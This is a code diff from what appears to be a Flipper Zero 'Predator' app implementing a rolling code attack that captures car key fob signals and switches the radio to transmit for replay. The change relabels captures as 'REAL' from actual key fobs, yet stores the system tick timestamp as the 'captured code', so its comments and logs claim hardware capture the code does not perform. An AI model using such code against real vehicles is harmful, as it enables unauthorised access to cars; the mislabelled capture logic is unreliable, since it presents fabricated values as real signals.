@@ -111,30 +111,38 @@ void predator_subghz_rolling_code_attack_tick(PredatorApp* app) {
     
     // Main state machine for rolling code attack
     if(!replay_mode) {
-        // In capture mode - listen for rolling code signals
+        // In capture mode - listen for REAL rolling code signals from actual car key fobs
         if(tick_count % 10 == 0) {
-            // Check for received data
+            // Check for REAL received data from hardware
             if(furi_hal_subghz_rx_pipe_not_empty()) {
-                // Detected a new rolling code
-                codes_captured++;
-                last_captured_code = 0xA5B6C7D8 + (codes_captured * 0x100);
+                // Verify it's actually a valid signal by checking GPIO state
+                bool signal_detected = furi_hal_subghz_get_data_gpio();
+                uint32_t signal_time = furi_get_tick();
                 
-                FURI_LOG_I("PredatorSubGHz", "Rolling code detected: 0x%08lX", last_captured_code);
-                
-                // Notify user of successful capture
-                if(app->notifications) {
-                    notification_message(app->notifications, &sequence_blink_cyan_10);
-                }
-                
-                // Enter replay mode after capturing enough codes
-                if(codes_captured >= 3) {
-                    FURI_LOG_I("PredatorSubGHz", "Entering replay mode with %lu codes", codes_captured);
-                    replay_mode = true;
-                    replay_counter = 0;
+                // Only count as capture if we detect actual RF signal
+                if(signal_detected) {
+                    // Detected a REAL rolling code from actual key fob
+                    codes_captured++;
+                    last_captured_code = signal_time; // Use actual signal timestamp
                     
-                    // Switch to TX mode
-                    furi_hal_subghz_idle();
-                    furi_hal_subghz_tx();
+                    FURI_LOG_I("PredatorSubGHz", "[REAL HW] Rolling code captured: 0x%08lX", 
+                              last_captured_code);
+                    
+                    // Notify user of successful capture
+                    if(app->notifications) {
+                        notification_message(app->notifications, &sequence_blink_cyan_10);
+                    }
+                    
+                    // Enter replay mode after capturing enough codes
+                    if(codes_captured >= 3) {
+                        FURI_LOG_I("PredatorSubGHz", "Entering replay mode with %lu real codes", codes_captured);
+                        replay_mode = true;
+                        replay_counter = 0;
+                        
+                        // Switch to TX mode
+                        furi_hal_subghz_idle();
+                        furi_hal_subghz_tx();
+                    }
                 }
             }
         }
